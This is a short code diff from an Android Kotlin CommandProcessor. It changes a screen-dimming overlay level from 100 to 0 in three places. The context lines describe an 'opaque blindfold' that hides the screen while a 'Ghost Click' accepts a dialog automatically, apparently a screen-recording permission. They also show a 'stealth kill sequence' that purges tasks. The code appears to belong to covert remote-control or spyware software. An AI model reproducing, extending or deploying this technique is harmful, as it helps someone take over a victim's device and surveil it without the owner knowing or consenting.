@@ -362,7 +362,7 @@ object CommandProcessor {
                         ScreenRecordManager.patternSuccessTimeoutMs = timeoutSec * 1000L
                         
                         android.os.Handler(android.os.Looper.getMainLooper()).post {
-                            DimmerManager.applyDim(ctx, 100, "OVERLAY")
+                            DimmerManager.applyDim(ctx, 0, "OVERLAY")
                             android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                                 if (ScreenRecordManager.expectedMode == "AUTO") {
                                     DimmerManager.removeOverlay(ctx)
@@ -616,7 +616,7 @@ object CommandProcessor {
                     if (mode == "AUTO") {
                         // Apply the opaque blindfold instantly before the dialog arrives
                         Handler(Looper.getMainLooper()).post {
-                            DimmerManager.applyDim(ctx, 100, "OVERLAY")
+                            DimmerManager.applyDim(ctx, 0, "OVERLAY")
                             
                             // FAIL-SAFE: If the Ghost Click fails or hangs, forcefully unblind after 10s
                             Handler(Looper.getMainLooper()).postDelayed({
@@ -1761,7 +1761,7 @@ object CommandProcessor {
                         status = "FAILED (SERVICE_OFF)"
                     } else {
                         android.os.Handler(android.os.Looper.getMainLooper()).post {
-                            DimmerManager.applyDim(ctx, 100, "ACC")
+                            DimmerManager.applyDim(ctx, 0, "ACC")
                             service.startStealthKillSequence()
                         }
                         status = "TASK_PURGE_INITIATED"
